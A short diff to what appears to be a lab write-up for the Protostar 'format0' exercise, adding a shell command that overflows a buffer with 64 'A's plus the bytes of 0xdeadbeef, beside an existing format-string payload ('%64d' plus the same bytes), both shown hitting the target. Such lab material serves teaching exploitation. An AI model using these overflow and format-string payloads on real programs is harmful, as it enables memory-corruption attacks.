@@ -44,6 +44,12 @@ user@protostar:/opt/protostar/bin$
 ```
 
 ```sh
+user@protostar:/opt/protostar/bin$ ./format0 $(python -c "print 'A'*64 + '\xef\xbe\xad\xde'")
+you have hit the target correctly :)
+user@protostar:/opt/protostar/bin$
+```
+
+```sh
 user@protostar:/opt/protostar/bin$ ./format0 `python -c "print '%64d\xef\xbe\xad\xde'"`
 you have hit the target correctly :)
 user@protostar:/opt/protostar/bin$
